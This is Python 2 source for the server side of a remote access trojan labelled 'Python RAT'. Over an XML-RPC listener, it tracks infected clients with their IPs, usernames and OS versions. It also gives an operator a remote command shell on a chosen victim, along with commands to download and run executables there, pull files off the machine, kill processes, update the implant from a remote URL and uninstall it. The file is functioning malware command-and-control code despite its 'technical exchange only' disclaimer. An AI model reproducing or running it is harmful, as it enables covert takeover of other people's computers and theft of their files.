#! /usr/bin/env python
#coding=utf-8

import time, sys, os
import threading
import xmlrpclib
from SimpleXMLRPCServer import SimpleXMLRPCServer
from svrdb import SvrDb
#http://blog.csdn.net/qianghaohao/article/details/52117082
from colorama import init, Fore, Back, Style

class SvrMethod():
    tsk = None
    #@staticmethod 
    @classmethod
    def set_taskmgr(cls, taskmgr):
        SvrMethod.tsk = taskmgr

    def __init__(self):
        self.tsk = SvrMethod.tsk
        self.db = self.tsk.getdb()
        self.i = 0

    def hello(self, id, ver, info):
        print id, 'is online.'
        self.tsk.hello(id, ver, info)
        self.tsk.new_cmd()

    def get_task(self, id):
        self.db.upd_client(id)
        task = self.db.get_task(id)
        if task == 'uninstall':
            self.tsk.del_cur_client()

        return task

    def resp_task(self, id, task_id, task, argv, ret, data):
        print '%s do %s(%d) %s %s' % (id, task, task_id, argv, str(ret))
        if task != 'upload':
            print data
        self.db.del_task(task_id)

        if ret and task == 'upload':
            self.tsk.update_done(data.data)

        self.tsk.new_cmd()

    def download(self, path):
        try:
            f = file(path, 'rb')
            b = f.read()
            f.close()
            return (True, xmlrpclib.Binary(b))
        except Exception as e:
            return (False, str(e))

    def update(self, id):
        print 'update'
        self.tsk.new_cmd()

    def close(self, id):
        self.db.clean_task(id)
        self.db.off_client(id)
        print id, 'is offline.'
        self.tsk.new_cmd()

class SvrTask(threading.Thread):
    def __init__(self):
        super(SvrTask, self).__init__()
        self.cmdmap = {
            'help': self.help,
            'list': self.list_client,
            'alive': self.list_alive_client,
            'kill': self.delete_client,
            'print': self.get_target,
            'select': self.sel_client,
            'cmdshell': self.cmdshell,
            'new': self.update,
            'download': self.download,
            'runexec': self.runexec,
            'upload': self.upload,
            'terminate': self.terminate_proc
        }
        self.cur_cid = None
        #SQLite objects created in a thread can only be used in that same thread.The object was created in thread id 34828 and this is thread id 8960
        self.db = SvrDb("svr.db")
        self.cmd_dir = None
        self.pre_cmd_tip = 'cmd >'
        self.upload_path = ''
    
    def getdb(self):
        return self.db

    def hello(self, id, ver, info):
        if self.cur_cid == None:
            self.cur_cid = id
            print 'Auto set target', self.cur_cid
        self.db.clean_task(id)
        self.db.add_client(id, ver, info)

    def run(self):
        while True:
            cmd = raw_input('cmd >').strip()
            if cmd == 'quit' or cmd =='q':
                #for debug, wait
                self.db.add_task(self.cur_cid, 'quit')
                print 'Quit server'
                os._exit(0)#sys.exit(0)
            if len(cmd) == 1:
                tmp = [k for k in self.cmdmap.keys() if k.startswith(cmd)]
                if len(tmp) <= 0:
                    print 'Invalid cmd:', cmd
                    continue
                cmd = tmp[0]

            method = self.cmdmap.get(cmd)
            if method:
                method()
            else:
                print 'Invalid cmd:', cmd

    def help(self):
        print '(l)ist:     list all clients'
        print '(a)live:    list alive clients'
        print '(k)ill:     delete client'
        print '(s)elect:   select target client'
        print '(p)rint:    show current client'
        print '(c)mdshell: create a cmdshell, type q to exit cmdshell'
        print '(n)ew:      update client version'
        print '(d)ownload: let client download a file'
        print '(r)unexec:  let client run a exe'
        print '(u)pload:   upload a file to client'
        print '(t)erminate:terminate process'
        print '(q)uit:     quit server'

    def new_cmd(self):
        #print self.pre_cmd_tip, 
        sys.stdout.write('\r')
        sys.stdout.write(self.pre_cmd_tip)
        sys.stdout.flush()

    def list_client(self):
        self.check_client(True)
        c = self.db.list_client()
        if c:
            title = ('id', 'client_id', 'version', 'localip', 'remoteip', 'username', 'osversion', 'firsttime', 'lasttime', 'status')
            fmt = '%-6s | %-26s | %-8s | %-20s | %-20s | %-20s | %-10s | %-20s | %-20s | %-6s'
            print fmt % title
            for ci in c:
                print fmt % ci
        else:
            print 'no client'

    def list_alive_client(self):
        self.check_client(True)
        c = self.db.list_alive_client()
        if c:
            title = ('id', 'client_id', 'version', 'localip', 'remoteip', 'username', 'osversion', 'firsttime', 'lasttime', 'status')
            fmt = '%-6s | %-26s | %-8s | %-20s | %-20s | %-20s | %-10s | %-20s | %-20s | %-6s'
            print fmt % title
            for ci in c:
                print fmt % ci
        else:
            print 'no alive client'

    def del_cur_client(self):
        self.db.del_client(self.cur_cid)

    def delete_client(self):
        target = raw_input('target cid(or ALL):').strip()
        if not target:
            print 'Please type a target to delete'
            return
        if target == 'ALL':
            self.db.del_all_client()
        else:
            r = raw_input("Do you want to uninstall client?(Y/N)").strip()
            if r == 'Y':
                self.db.add_task(target, 'uninstall', '')
            else:
                self.db.del_client(target)

    def get_target(self):
        print self.cur_cid
        self.check_client()
    
    def sel_client(self):
        id = raw_input('client_id:')
        if not id:
            print 'Invalid client_id NULL' 
        elif not self.db.get_client(id):
            print 'Invalid client_id', id
        else:
            self.cur_cid = id
            print 'Set target client:', id
            self.check_client()
    
    def has_client(self):
        if not self.cur_cid:
            print 'Please first set target client by (s)elect command.'
            return False
        if not self.check_client():
            self.cur_cid = None
            return False
        return True

    def _check_client(self, c):
        cid_index = 1
        time_index = 8
        time_diff = 2*60
        last_time = time.mktime(time.strptime(c[time_index], "%Y-%m-%d %H:%M:%S"))
        diff = time.time() - last_time
        if diff >= time_diff:
            self.db.off_client(c[cid_index])
            print '%s offline %s!' % (c[cid_index], c[time_index])
            return False
        return True

    def check_client(self, check_all=False):
        '''check status of the client in every cmd.'''
        if check_all:
            clients = self.db.list_alive_client()
            if clients:
                for c in clients:
                    self._check_client(c)
        else:
            client = self.db.get_client(self.cur_cid)
            if client:
                return self._check_client(client[0])
        return True

    def update(self):
        if self.has_client():
            self.db.add_task(self.cur_cid, 'update', 'http://pyrat.com/?v=1.3')
    
    def update_done(self, data):
        while True:
            path = self.upload_path
            if not path:
                path = './'
            try:
                f = file(path, 'wb')
                f.write(data)
                f.close()
                print 'upload success,', path
            except Exception as e:
                print e
                y = raw_input('failed, retry?(Y/N):')
                if y != 'N':
                    continue
            break

    def downlocal(self):
        local = raw_input("local file:")
        if not local:
            print 'you have not type a file path'
            return None
        if not os.path.exists(local):
            print 'the file %s not exist' % local
            return None
        return local

    def download(self):
        if self.has_client():
            dtype = 'net'
            url = raw_input("url(type N to download local file):")
            if url ==  'N':
                url = self.downlocal()
                if not url:
                    return
                dtype = 'local'
            path = raw_input("dest path:")
            argv = dtype + ' ' + url + ' ' + path
            self.db.add_task(self.cur_cid, 'download', argv)
    
    def runexec(self):
        if self.has_client():
            path = raw_input('run target:')
            if not path:
                print 'Type nothing'
                return
            self.db.add_task(self.cur_cid, 'runexec', path)
            print 'runexec', path

    def upload(self):
        if self.has_client():
            path = raw_input("target file:").strip()
            if not path:
                print 'Type nothing'
                return
            dst = raw_input("local path:").strip()
            if not dst:
                print 'Type nothing'
                return
            self.upload_path = dst
            self.db.add_task(self.cur_cid, 'upload', path)

    def terminate_proc(self):
        if self.has_client():
            ptype = raw_input('Select type(name/pid):')
            val = ''
            if not ptype:
                ptype = 'name'
                print 'you select the default type: name'
            if ptype == 'name':
                val = raw_input('process name:').strip()
            elif ptype == 'pid':
                val = raw_input('process pid:').strip()
            else:
                print 'Invalid select'
                return
            if not val:
                print 'Invalid type'
                return
            argv = ptype + ' ' + val
            self.db.add_task(self.cur_cid, 'terminate', argv)

    def cmdshell(self):
        if self.has_client():
            while True:
                self.pre_cmd_tip = 'RAT-CMD > '
                cmd = raw_input('RAT-CMD > ').strip()
                if not self.check_client():
                    self.cur_cid = None
                    return
                #just for debug
                if cmd:
                    if cmd == 'quit' or cmd == 'q':
                        self.pre_cmd_tip = 'cmd > '
                        break
                    tmp = cmd.split(' ')
                    tmp = [i for i in tmp if i != '']
                    if len(tmp) == 2 and tmp[0] == 'cd':
                        self.cmd_dir = tmp[1]
                    elif self.cmd_dir:
                        cmd = "cd " + self.cmd_dir + ' && ' + cmd
                    self.db.add_task(self.cur_cid, 'cmdshell', cmd)

class XMLSvr():
    def __init__(self, port):
        self.svrtask = SvrTask()
        SvrMethod.set_taskmgr(self.svrtask) #在SvrMethod()前
        self.svr = SimpleXMLRPCServer(("0.0.0.0", port), logRequests=False, allow_none=True)
        self.svr.register_instance(SvrMethod())

    def start(self):
        self.svrtask.start()
        self.svr.serve_forever()

# 在使用本方法之前，请先做如下import
# from __future__ import division
import math
# import sys
# ##blog.useasp.net##
def progressbar(cur, total):
    percent = '{:.2%}'.format(cur*1.0 / total)
    sys.stdout.write('\r')
    sys.stdout.write("[%-50s] %s" % ( '=' * int(math.floor(cur * 50 / total)), percent))
    sys.stdout.flush()

def test():
    for i in xrange(0, 100):
        progressbar(i, 100)
        time.sleep(1)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print 'usage: pyratsvr.py port'
        os._exit(0)
    init(autoreset=True)
    print '--------------------Python RAT-----------------------'
    print '--------------------anhkgg---------------------------'
    print '--------------------Copyright (c) 2018---------------'
    print ''
    print Fore.RED+'软件仅供技术交流，请勿用于商业及非法用途，如产生法律纠纷与本人无关!'.decode('utf8')+Fore.RESET
    print ''
    print '--------------------Task command---------------------'
    print '--|(l)ist (a)live (k)ill (s)elect (p)rint (c)mdshell (n)ew (d)ownload (r)unexec (u)pload (t)erminate (q)uit (h)elp|--'
    print ''
    svr = XMLSvr(int(sys.argv[1]))
    svr.start()
